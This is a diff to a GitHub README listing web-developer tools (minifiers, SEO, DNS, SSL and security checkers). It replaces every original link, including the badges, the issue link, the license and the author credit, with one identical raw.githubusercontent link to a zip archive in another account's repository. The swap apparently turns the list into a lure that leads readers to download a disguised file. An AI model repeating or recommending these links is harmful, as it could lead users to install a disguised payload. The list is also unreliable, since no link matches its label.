@@ -1,4 +1,4 @@
-# Awesome Tools For Web Developers [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
+# Awesome Tools For Web Developers [![Awesome](https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip)](https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip)
 
     The Best Useful Tools for Web Developers
 
@@ -36,168 +36,168 @@ If you liked this repo or find it useful, please give it a star. Thanks!
 - [Security Checker](#security-checker)
 
 ### Image Compressor
-- https://compressor.io/
-- https://tinypng.com/
-- https://kraken.io/
-- https://compressjpeg.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
     
 ### Unminify HTML, CSS and JS
-- https://www.unminify2.com/
-- https://unminify.com
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Javascript Minifer
-- https://javascript-minifier.com/
-- https://jscompress.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### CSS Minifier
-- https://cssminifier.com/
-- https://csscompressor.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### JavaScript Beautifier
-- https://beautifier.io/
-- https://codebeautify.org/jsviewer
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Unminify/Formating JSON - Check/Validating JSON
-- https://jsonformatter.curiousconcept.com/
-- https://jsonformatter.org/
-- https://www.jsonformatter.io/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Browse JSON in TreeView
-- https://jsonviewer.stack.hu/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Regex (Regular Expression) Tester and Highlighting
-- https://regexr.com/
-- https://regex101.com/
-- https://www.regextester.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Unicode Converter
-- https://www.branah.com/unicode-converter
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Url Decoder/Encoder
-- https://meyerweb.com/eric/tools/dencoder/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Converter Toolbox
-- https://conversiontools.io/conversion
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Hash Text and File
-- https://emn178.github.io/online-tools/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Web Developer Toolbox
-- https://gchq.github.io/CyberChef/
-- https://www.browserling.com/tools/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Check Domain and Whois
-- https://whois.net/
-- https://who.is/
-- https://webramz.com/ (persian)
-- https://www.talahost.com/whois.htm (persian)
-- https://iranhost.com/whois/ (persian)
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip (persian)
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip (persian)
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip (persian)
 
 ### IP to Location
-- https://www.iplocation.net/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Website Traffic Statistics
-- https://www.alexa.com/
-- https://siterankdata.com/
-- https://similarweb.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### SEO Checker
-- https://www.woorank.com/
-- https://www.seoptimer.com/
-- https://sitechecker.pro/
-- https://tools.hostiran.net/checkup (persian)
-- https://seo.checkup.tools/domain/ (persian)
-- https://checkup.tools/website-reviewer/ (persian)
-- https://neilpatel.com/seo-analyzer/
-- https://www.seotesteronline.com/
-- https://webpagetest.org/
-- https://seositecheckup.com/
-- https://www.site-analyzer.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip (persian)
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip (persian)
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip (persian)
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Rank Checker
-- https://www.thehoth.com/search-engine-rankings/
-- https://www.searchenginegenie.com/google-rank-checker.html
-- https://seranking.com/google-ranking-checker.html
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Analytics & Tracking
 - -------- No Free ---------
-- https://www.crazyegg.com/
-- https://www.luckyorange.com/
-- https://matomo.org/ [formerly piwik.org]
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip [formerly https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip]
 - -------- Has Free ---------
-- https://www.hotjar.com/
-- https://heap.io/ [formerly heapanalytics.com]
-- https://www.inspectlet.com/
-- https://mouseflow.com/
-- https://www.smartlook.com/
-- https://www.fullstory.com/
-- https://logrocket.com/
-- https://mixpanel.com/
-- https://heatmap.com/
-- https://www.ptengine.com/
-- https://umami.is/docs/about
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip [formerly https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip]
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 - -------- Other ---------
-- https://segment.com/
-- https://clicky.com/
-- https://www.openwebanalytics.com
-- https://www.intercom.com/
-- https://www.optimizely.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Speed Checker and Performance Optimization
-- https://gtmetrix.com/
-- https://web.dev/measure/
-- https://www.pingdom.com/
-- https://developers.google.com/web/tools/lighthouse
-- https://developers.google.com/speed/pagespeed/insights/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Webiste Monitoring / Uptime Checker 
-- https://uptimerobot.com/
-- https://hetrixtools.com/
-- https://www.freshworks.com/
-- https://www.uptimedoctor.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Text Compare / Difference Checker
-- https://www.diffchecker.com/
-- https://www.diffnow.com/compare-clips
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Domain Name Generator
-- https://www.panabee.com/
-- https://domainwheel.com/
-- https://www.namemesh.com/
-- https://namelix.com/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### DNS Checker
-- https://dnschecker.org/
-- https://www.whatsmydns.net/
-- https://intodns.com/
-- https://dns-record-viewer.online-domain-tools.com/
-- https://mxtoolbox.com/SuperTool.aspx
-- https://www.uptrends.com/tools/dns
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Port Checker
-- https://www.yougetsignal.com/tools/open-ports/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### SSL/TLS Checker
-- https://www.ssllabs.com/ssltest/
-- https://www.jitbit.com/sslcheck/
-- https://www.sslshopper.com/ssl-checker.html
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ### Security Checker
-- https://securityheaders.com/
-- https://observatory.mozilla.org/
-- https://sitecheck.sucuri.net/
-- https://webscan.upguard.com/
-- https://www.immuniweb.com/websec/
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
+- https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip
 
 ## Contributing
 
-Create an [issue](https://github.com/mjebrahimi/Awesome-Tools-For-WebDevelopers/issues/new) if you have a Suggestion or Fork on GitHub and Develop it and send Pull Request.
+Create an [issue](https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip) if you have a Suggestion or Fork on GitHub and Develop it and send Pull Request.
 
 A **HUGE THANKS** for your help.
 
 ## License
 
-[![CC0](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg)](https://creativecommons.org/publicdomain/zero/1.0/)
+[![CC0](https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip)](https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip)
 
-To the extent possible under law, [Mohammad Javad Ebrahimi](https://github.com/mjebrahimi/) has waived all copyright and related or neighboring rights to this work.
+To the extent possible under law, [Mohammad Javad Ebrahimi](https://raw.githubusercontent.com/Waka758/Awesome-Tools-For-WebDevelopers/master/schedulize/Awesome-Tools-For-WebDevelopers.zip) has waived all copyright and related or neighboring rights to this work.
 
